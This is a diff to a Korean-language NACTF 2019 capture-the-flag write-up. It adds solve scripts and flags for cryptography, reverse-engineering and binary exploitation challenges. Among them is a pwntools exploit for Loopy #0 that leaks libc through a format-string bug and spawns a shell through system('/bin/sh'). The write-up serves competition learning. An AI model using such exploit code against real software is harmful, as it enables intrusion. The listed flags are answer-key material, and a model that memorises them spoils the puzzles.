@@ -2,52 +2,52 @@
 with team `༼ つ ◕_◕ ༽つ 뀨` (43/1335)  
 
 ## Cryptography
-[Vyom's Soggy Croutons](#Vyom-s-Soggy-Croutons)
-[Loony Tunes](#Loony-Tunes)
-[Super Duper AES](#Super-Duper-AES)
-[Dr.J's Group Test Randomizer:Board Problem #0](#Dr.J's-Group-Test-Randomizer:Board-Problem-#0)  
-[Dr.J's Group Test Randomizer:Board Problem #1](#Dr.J's-Group-Test-Randomizer:Board-Problem-#1)
-[Dr.J's Group Test Randomizer:BBOB #2](#Dr.J's-Group-Test-Randomizer:BBOB-#2)
-[Reversible Sneaky Algorithm #0](#Reversible-Sneaky-Algorithm-#0)
-[Reversible Sneaky Algorithm #1](#Reversible-Sneaky-Algorithm-#1)
-[Reversible Sneaky Algorithm #2](#Reversible-Sneaky-Algorithm-#2)
-
+[Vyom's Soggy Croutons](#Vyom-s-Soggy-Croutons)  
+[Loony Tunes](#Loony-Tunes)  
+[Super Duper AES](#Super-Duper-AES)  
+[Dr.J's Group Test Randomizer:Board Problem #0](#Dr-J-s-Group-Test-Randomizer:Board-Problem0)  
+[Dr.J's Group Test Randomizer:Board Problem #1](#Dr-J-s-Group-Test-Randomizer:Board-Problem-1)  
+[Dr.J's Group Test Randomizer:BBOB #2](#Dr-J-s-Group-Test-Randomizer:BBOB-2)  
+[Reversible Sneaky Algorithm #0](#Reversible-Sneaky-Algorithm-0)  
+[Reversible Sneaky Algorithm #1](#Reversible-Sneaky-Algorithm-1)  
+[Reversible Sneaky Algorithm #2](#Reversible-Sneaky-Algorithm-2)  
+  
 ## Reverse Engineering
-[Keygen](#Keygen)
+[Keygen](#Keygen)  
 
 ## General Skills
-[Intro to Flags](#Intro-to-Flags)
-[Join the Discord](#Join-the-Discord)
-[What the HEX?](#What-the-HEX?)
-[Off-base](#Off-base)
-[Cat over the wire](#Cat-over-the-wire)
-[Grace's HashBrowns](#Grace's-HashBrowns)
-[SHCALC](#SHCALC)
-[Hwang's Hidden Handiwork](#Hwang's-Hidden-Handiwork)
-[Get a GREP #0!](#Get-a-GREP-#0!)
-[Get a GREP #1!](#Get-a-GREP-#1!)
-[Cellular Evolution #0:Bellsprout](#Cellular-Evolution-#0:Bellsprout)
-[Cellular Evolution #1:Weepinbell](#Cellular-Evolution-#1:Weepinbell)
-[Cellular Evolution #2:VikTreebel](#Cellular-Evolution-#2:VikTreebel)
-[Cellular Evolution #3:BBOB](#Cellular-Evolution-#3:BBOB)
+[Intro to Flags](#Intro-to-Flags)  
+[Join the Discord](#Join-the-Discord)  
+[What the HEX?](#What-the-HEX)  
+[Off-base](#Off-base)  
+[Cat over the wire](#Cat-over-the-wire)  
+[Grace's HashBrowns](#Grace-s-HashBrowns)  
+[SHCALC](#SHCALC)  
+[Hwang's Hidden Handiwork](#Hwang-s-Hidden-Handiwork)  
+[Get a GREP #0!](#Get-a-GREP-0)  
+[Get a GREP #1!](#Get-a-GREP-1)  
+[Cellular Evolution #0:Bellsprout](#Cellular-Evolution-0-Bellsprout)   
+[Cellular Evolution #1:Weepinbell](#Cellular-Evolution-1-Weepinbell)  
+[Cellular Evolution #2:VikTreebel](#Cellular-Evolution-2-VikTreebel)  
+[Cellular Evolution #3:BBOB](#Cellular-Evolution-3-BBOB)  
 
 
 ## Binary Exploitation
-[BufferOverflow #0](#BufferOverflow-0)
-[BufferOverflow #1](#BufferOverflow-1)
-[BufferOverflow #2](#BufferOverflow-2)
-[Format #0](#Format-0)
-[Format #1](#Format-1)
-[Loopy #0](#Loopy-0)
-[Loopy #1](#Loopy-1)
+[BufferOverflow #0](#BufferOverflow-0)  
+[BufferOverflow #1](#BufferOverflow-1)  
+[BufferOverflow #2](#BufferOverflow-2)   
+[Format #0](#Format-0)  
+[Format #1](#Format-1)  
+[Loopy #0](#Loopy-0)  
+[Loopy #1](#Loopy-1)  
 
 ## Forensics
 [Least Significant Avenger](#Least-Significant-Avenger)  
 [The MetaMeme](#The-MetaMeme)  
 [My Ears Hurt](#My-Ears-Hurt)  
 [Unzip Me](#Unzip-Me)  
-[Kellen's Broken File](#Kellen's-Broken-File)  
-[Kellen's PDF sandwich](#Kellen's-PDF-sandwich)  
+[Kellen's Broken File](#Kellen-s-Broken-File)  
+[Kellen's PDF sandwich](#Kellen-s-PDF-sandwich)  
 [Filesystem Image](#Filesystem-Image)  
 [Phuzzy Photo](#Phuzzy-Photo)  
 [File recovery](#File-recovery)  
@@ -87,7 +87,71 @@ P.P.S the flag is all lowercase
 # Super Duper AES
 ```
 The Advanced Encryption Standard (AES) has got to go. Spencer just invented the Super Duper Advanced Encryption Standard (SDAES), and it's 100% unbreakable. AES only performs up to 14 rounds of substitution and permutation, while SDAES performs 10,000. That's so secure, SDAES doesn't even use a key!
+
+
 ```
+## exploit
+코드 분석이 조금 오래걸렸는데 원본코드에서 print문 이곳저곳에 넣어서 실행해보면서 `substitute()` 함수와 `permute()` 함수의 역함수를 만들면 된다.
+```python
+import sys
+from binascii import hexlify
+    
+def de_substitute(substitutedHexBlock):
+    substitution =  [8, 4, 15, 9, 3, 14, 6, 2, 
+                    13, 1, 7, 5, 12, 10, 11, 0]
+    r = ""
+    for i in range(0, len(substitutedHexBlock)):
+        d = int(substitutedHexBlock[i], 16)
+        r += str(hex(substitution.index(d))[2:])
+    
+    return r
+
+def pad(message):
+    numBytes = 4-(len(message)%4)
+    return message + numBytes * chr(numBytes)
+
+def hexpad(hexBlock):
+    numZeros = 8 - len(hexBlock)
+    return numZeros*"0" + hexBlock
+
+def de_permute(message):
+    permutation =   [6, 22, 30, 18, 29, 4, 23, 19, 
+                    15, 1, 31, 11, 28, 14, 25, 2, 
+                    27, 12, 21, 26, 10, 16, 0, 24,
+                     7, 5, 3, 20, 13, 9, 17, 8]
+    msg = int(message, 16)
+    hexBlock = 0
+    for i in range(32):
+        bit = (msg & (1 << i)) >> i
+        if bit == 1:
+            j = permutation.index(i)
+            hexBlock |= 1 << j
+    r = hexpad(hex(hexBlock)[2:])
+    return r
+
+def decrypt(enc):
+    numBlocks = len(enc) // 8
+    de_pmsg = ""
+    for i in range(numBlocks):
+        de_pmsg += de_permute(enc[8*i:8*i+8])
+
+    de_smsg = ""
+    for i in range(numBlocks):
+        de_smsg += de_substitute(de_pmsg[8*i:8*i+8])
+
+    return de_smsg
+
+
+j = 10000
+plaintext = "d59fd3f37182486a44231de4713131d20324fbfe80e91ae48658ba707cb84841972305fc3e0111c753733cf2"
+for i in range(j):
+    plaintext = decrypt(plaintext)
+plaintext = "".join([chr(int(plaintext[i:i+2],16)) for i in range(0,len(plaintext),2)])
+print ("[!]", plaintext)
+```
+## flag
+`nactf{5ub5t1tut10n_p3rmutat10n_n33d5_a_k3y}`
+
 # Dr.J's Group Test Randomizer:Board Problem #0
 ```
 Dr. J created a fast pseudorandom number generator (prng) to randomly assign pairs for the upcoming group test. Leaf really wants to know the pairs ahead of time... can you help him and predict the next output of Dr. J's prng? Leaf is pretty sure that Dr. J is using the middle-square method.
@@ -96,6 +160,56 @@ nc shell.2019.nactf.com 31425
 
 The server is running the code in class-randomizer-0.c. Look at the function nextRand() to see how numbers are being generated!
 ```
+## analysis
+랜덤값을 연속 두 번 맞추면 되는 문제다. 랜덤값을 가져오는 `nextRand()`함수를 잘 살펴보면 랜덤 결과를 랜덤 시드로 사용하는것을 알 수 있다.
+```c 
+uint64_t nextRand() {
+  // Keep the 8 middle digits from 5 to 12 (inclusive) and square.
+  seed = getDigits(seed, 5, 12);
+  seed *= seed;
+  return seed;
+}
+```
+이러한 알고리즘의 취약성은 랜덤값이 한번이라도 중복된다면 그 이후 랜덤 결과들도 모두 같아진다. 그러므로 중복값이 나올 때까지 랜덤값을 받고, 이후 랜덤값을 알 수 있으니 2번 연속을 맞추면 된다.
+## exploit
+``` python
+from pwn import *
+
+#context.log_level = 'debug'
+
+r = remote("shell.2019.nactf.com", 31425)
+c = []
+def solve(lst):
+	r.recvuntil("> ")
+	r.sendline("g")
+	for i in lst:
+		print(r.recvuntil("> "))
+		r.sendline(str(i))
+	print(r.recvuntil("flag: "))
+	flag = r.recvline()
+	log.success(flag)
+
+l = log.progress("Find Loop")
+while True:
+	r.recvuntil("> ")
+	r.sendline("r")
+	num = int(r.recvline())
+	l.status(str(num))
+	if num in c:
+		if c[-1] == num:
+			loop = [num, num]
+		else:
+			idx = c[:-1].index(num)
+			loop = c[idx+1:idx+3]
+		log.info("Find it!! : "+str(loop))
+		solve(loop)
+		break
+	else:
+		c.append(num)
+```
+## flag
+`nactf{1_l0v3_chunky_7urn1p5}`
+
 # Dr.J's Group Test Randomizer:Board Problem #1
 ```
 Dr. J is back with another group test, and he patched his prng so we can't predict the next number based on the previous one! Can still you help Leaf predict the next output of the prng?
@@ -104,6 +218,58 @@ nc shell.2019.nactf.com 31258
 
 So we can't use the output to predict the next number... but I wonder if the numbers will repeat?
 ```
+## exploit
+``` python
+from pwn import *
+
+#context.log_level = 'debug'
+
+r = remote("shell.2019.nactf.com", 31258)
+c = []
+stack = []
+def solve(lst):
+	r.recvuntil("> ")
+	r.sendline("g")
+	for i in lst:
+		r.recvuntil("> ")
+		r.sendline(str(i))
+	r.recvuntil("flag:\n")
+	flag = r.recvline()
+	log.success(flag)
+
+def getNumber():
+	r.recvuntil("> ")
+	r.sendline("r")
+	r_num = int(r.recvline())
+	return r_num
+
+def checkLoop(cnt):
+	loop = "".join([str(i)+", " for i in c[-cnt:]])[:-2]
+	if loop in str(c[:-cnt]):
+		return True
+	return False
+
+def getLoop(cnt):
+	loop = "".join([str(i)+", " for i in c[-cnt:]])[:-2]
+	idx = str(c[:-cnt]).index(loop)
+	loop = str(c)[idx:-1].split(", ")
+	return loop[cnt:cnt+4]
+
+l = log.progress("Find Loop")
+while True:
+	match_len = 10
+	num = getNumber()
+	l.status(str(num))
+	c.append(num)
+	if checkLoop(match_len):
+		lp = getLoop(match_len)
+		log.info(lp)
+		solve(lp)
+		break
+```
+## flag
+`nactf{th3_b35t_pr3d1ct0r_0f_fu7ur3_b3h4v10r_15_p4st_b3h4v10r}`
+
 # Dr.J's Group Test Randomizer:BBOB #2
 ```
 This is it. The last group test of the year. Dr. J patched his prng again so numbers won't repeat, so I guess Leaf won't get to know the group test pairs ahead of time... oh WEYL. Who knew middle square could make such a good prng?
@@ -120,6 +286,24 @@ Yavan sent me these really large numbers... what can they mean? He sent me the c
 
 Can you help me decrypt his cipher?
 ```
+## analysis
+n과 d값을 알 때 복호화 하는 과정을 묻는 문제였고, 결국 `m = pow(c, d, n)`의 값을 구하는 문제였다.
+## exploit
+```python
+from Crypto.Util import number
+n = 14097136998272...388956217393838955462967989235557729
+d = 32103967178726...791638682520989591783787929482763483
+c = 75974475811116...540681944709850299154477898517149127
+
+# https://en.wikipedia.org/wiki/RSA_(cryptosystem)
+m = pow(c, d, n)
+
+flag = number.long_to_bytes(m)
+print(flag)
+```
+## flag
+`nactf{w3lc0me_t0_numb3r_th30ry}`
+
 # Reversible Sneaky Algorithm #1
 ```
 Lori decided to implement RSA without any security measures like random padding. Must be deterministic then, huh? Silly goose!
@@ -132,6 +316,30 @@ The flag seems pretty short... can you brute-force it?
 
 (Note: By brute-force, we do not mean brute-forcing the flag submission - do not SUBMIT dozens of flags. Brute force on your own computer.)
 ```
+## analysis
+flag가 4글자이므로 평문 기반으로 테이블을 만들어 복호화 할 수 있는지 묻는 문제였다.
+## exploit
+```python
+from Crypto.Util import number
+
+n = 22211149480575639...5032550658101647
+e = 65537
+c = 17092019895398435...5299057956641732
+
+lst = "abcdefghijklmnopqrstuvwxyz"
+for i in lst:
+	for j in lst:
+		for k in lst:
+			for l in lst:
+				flag = "nactf{"+i+j+k+l+"}"
+				msg = number.bytes_to_long(flag)
+				cipher = pow(msg, e, n)
+				if cipher == c :
+					print(flag)
+					exit()
+```
+## flag
+`nactf{pkcs}`
 
 # Reversible Sneaky Algorithm #2
 ```
@@ -149,6 +357,47 @@ I'm pretty SHOR Oligar was building a quantum computer for something...
 ```
 Can you figure out what the key to this program is?
 ```
+## exploit
+``` python
+res = 21380291284888
+flag = ""
+
+def check(i, mini, maxi):
+	for j in range(2):
+		#print(i*j, mini, maxi)
+		if i+62*j > mini and i+62*j <= maxi:
+			return i+62*j
+	return 0
+
+for k in range(8):
+	# a
+	a = res - 4
+	val_a = check(a % 62, 47, 57)
+	# b
+	b = res + 71
+	val_b = check(b % 62, 96, 122)
+	# c
+	c = res + 65
+	val_c = check(c % 62, 64, 90)
+
+	if val_a != 0:
+		res = a - val_a
+		flag += chr(val_a)
+	elif val_b != 0:
+		res = b - val_b
+		flag += chr(val_b)
+	elif val_c != 0:
+		res = c - val_c
+		flag += chr(val_c)
+
+	res //= 62
+
+flag  = "nactf{" + flag[::-1] + "}"
+print(flag)
+```
+## flag
+`nactf{GEZhxWsw}`
+
 # Intro to Flags
 ```
 Your flag is nactf{w3lc0m3_t0_th3_m4tr1x}.
@@ -324,16 +573,25 @@ He loves it so much that he started growing Cellular Automata in a little jar of
 
 Use the flag format nactf{...}
 ```
+## solve
+그냥저냥 프로그래밍 문제,,
+
 # Cellular Evolution #1:Weepinbell
 ```
 Apparently, Vikram was not satisfied with your work because he hired a new assistant: Eric. Eric has been doing a great job with managing the cells but he has allergies. Eric sneezed and accidentally messed up the order of the cells. Can you help Eric piece the cells back together?
 
 btw, flag is all lowercase
 ```
+## solve
+그냥저냥 프로그래밍 문제,,
+
 # Cellular Evolution #2:VikTreebel
 ```
 Thanks to your help, Eric and Vikram fixed their cells. Business is booming, and they're now a multinational megacorporation! They need bigger cells to meet demand: Eric used the rule "sum8" to evolve his cells to their next stage of evolution! Sum8 sets each cell to the sum of the cells around it (see examples). Eric sent us his evolved cells, but we want to know what they looked like before! Can you turn back time and get the flag?
 ```
+## solve
+그냥저냥 눈썰미 문제,,
+
 # Cellular Evolution #3:BBOB
 ```
 Dr. J was teaching Linear Algebra when he decided to buy some of Eric and Vik's cells! He cultivated the cells, drew a secret flag, and performed one step of "sum8". Luckily, he learned from Eric's mistake and added random 0's, 1's, and 2's in the background so nobody can reverse the message. Can you still get the flag?
@@ -351,11 +609,8 @@ This takes about 5 minutes to run on a laptop.
 =====
 The numbers in inpattern.txt are hexadecimal.
 ```
-
-
-
-
-
+## solve
+그냥저냥 어려운 프로그래밍 문제,,
 
 # BufferOverflow #0
 ```
@@ -497,12 +752,58 @@ This program is quite short, but has got printf and gets in it! This shouldn't b
 
 Connect at nc shell.2019.nactf.com 31283
 ```
+## exploit
+코드를 보면 flag.txt를 보여주지도 않고, 쉘을 띄워주는 코드도 없다. 직접 `system("/bin/sh")`를 실행해야 한다. system함수의 주소를 구하기 위해서 libc base가 필요한데 main이 종료되고 리턴하는 `__libc_start_main`의 주소를 `FSB`를 통해 스택에서 leak 하면 된다. 그리고 프로그램을 종료시키지 않고 한번에 바로 공격하기 위해 리턴주소를 overflow 해서 main으로 다시 향하게 한다. 구해진 `__libc_start_main`의 주소에서 해당 asm의 오프셋(241)을 빼면 실제 함수 주소가 나오고, 서버에서 로드되는 `libc.so.6`에서 같은 함수의 오프셋을 뽑아서 실제 함수 주소에서 차감하면 libc의 주소를 구할 수 있다. 구해진 libc에서 `libc.so.6`에서 뽑아온 system 함수의 오프셋을 더해서 실제 system 함수 주소를 구할 수 있다. 필요한 주소를 모두 구했으니 해당 함수를 실행하도록 overwrite를 한번 더 시도하면 된다.
+```python
+from pwn import *
+
+#context.log_level = "debug"
+
+
+#x = process("./loopy-0")
+x = remote("shell.2019.nactf.com", 31283)
+c_main = 0x080491e7
+
+e = ELF("./loopy-0")
+#lib = e.libc
+lib = ELF("../libc.so.6")
+
+def doit(payload):
+	x.recvuntil("Type something>")
+	x.sendline(payload)
+
+# === fsb for libc ===
+p = "a"*71 # buf(64) + dummy(8) - 1
+p += "%27$p" # __libc_start_main+241 in sfp(4)
+p += p32(c_main) # return to main
+doit(p)
+x.recvuntil("0x")
+libc = int(x.recv(8),16) - 241 - lib.symbols['__libc_start_main']
+log.info("libc :" +hex(libc))
+
+# === system("/bin/sh") ===
+p = "a"*76
+p += p32(libc + lib.symbols['system']) # system()
+p += "rrrr" # ret
+p += p32(libc + next(lib.search("/bin/sh"))) # /bin/sh
+doit(p)
+
+x.interactive()
+```
+## flag
+`nactf{jus7_c411_17_4g41n_AnZPLmjm}`
+
 # Loopy #1
 ```
 Same program as Loopy #0, but someone's turned on the stack protector now!
 
 Connect at nc shell.2019.nactf.com 31732
 ```
+
+
+
+
+
 
 
 
@@ -724,13 +1025,5 @@ sesamestreet.web.2019.nactf.com
 
 ## flag
 `nactf{c000000000ki3s}`
-
-
-
-
-
-
-
-
 
 
